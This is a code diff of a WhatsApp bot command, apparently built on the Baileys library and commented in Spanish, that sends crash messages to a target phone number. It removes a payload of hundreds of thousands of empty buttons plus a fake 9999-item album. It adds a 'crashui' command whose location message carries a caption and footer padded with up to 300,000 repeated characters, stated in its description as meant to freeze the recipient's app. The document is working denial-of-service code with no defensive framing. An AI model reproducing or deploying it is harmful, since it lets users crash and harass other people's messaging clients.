@@ -3,33 +3,10 @@ import { fytBold } from "../../core/socketText.ts";
 
 const digits = (j: string) => String(j || "").split("@")[0].split(":")[0].replace(/\D/g, "");
 
-function buildPayload(buttons: number, texto: string) {
-  return {
-    groupStatusMessageV2: {
-      message: {
-        interactiveMessage: {
-          body: { text: texto },
-          nativeFlowMessage: {
-            buttons: Array.from({ length: buttons }, () => ({})),
-          },
-          contextInfo: {
-            quotedMessage: {
-              albumMessage: {
-                expectedImageCount: 9999,
-                expectedVideoCount: 9999,
-              },
-            },
-          },
-        },
-      },
-    },
-  };
-}
-
 export default {
-  name: ["crashx", "frezz", "xcx"],
+  name: ["crashui", "crashuia14"],
   category: "group",
-  description: "Bombardeo de botones nativos vacíos + álbum fantasma de 9999+9999. `.crashx [botones] [texto]`.",
+  description: "Congela la UI con ubicación + caption y footer gigantes. `.crashui [repeticiones]`.",
   async run(ctx: CommandContext) {
     const { sock, from, msg, args, reply, react } = ctx;
 
@@ -41,30 +18,36 @@ export default {
     const num = escrito.length >= 8 ? escrito : mencion || citado;
     const target = num ? `${num}@s.whatsapp.net` : from;
 
-    let botones = 500000;
-    let desde = 0;
+    let repes = 120000;
+    if (/^\d+$/.test(args[0] || "")) repes = Math.min(300000, Math.max(1000, Number(args[0])));
 
-    if (/^\d+$/.test(args[0] || "")) {
-      botones = Math.min(900000, Math.max(1, Number(args[0])));
-      desde = 1;
-    }
-
-    const texto = args.slice(desde).join(" ").trim() || "X";
+    const relleno = "ꦾ".repeat(repes);
 
     await react("🧨").catch(() => undefined);
 
     try {
-      const { generateWAMessageFromContent } = await import("baileys");
-
-      const trava = generateWAMessageFromContent(target, buildPayload(botones, texto) as any, {});
-
-      await sock.relayMessage(target, trava.message, { messageId: trava.key.id });
+      await sock.sendMessage(target, {
+        location: {
+          degreesLatitude: 0,
+          degreesLongitude: 0,
+          name: "x",
+          url: "x",
+          address: "向导书呆子锁测试",
+        },
+        caption: "x" + relleno,
+        footer: relleno,
+        buttons: [
+          {
+            buttonId: "by x",
+            buttonText: { displayText: "x" },
+          },
+        ],
+      } as any);
 
       await react("☠️").catch(() => undefined);
       await reply(
-        `🧨 ${fytBold("Frezz enviado")} → ${num ? `+${num}` : "este chat"}\n` +
-          `Botones: ${botones.toLocaleString("es-MX")}\n` +
-          `Álbum fantasma: 9999 img + 9999 vid`,
+        `🧨 ${fytBold("CrashUI enviado")} → ${num ? `+${num}` : "este chat"}\n` +
+          `Repeticiones: ${repes.toLocaleString("es-MX")} (caption + footer)`,
       ).catch(() => undefined);
     } catch (e: any) {
       await react("❌").catch(() => undefined);
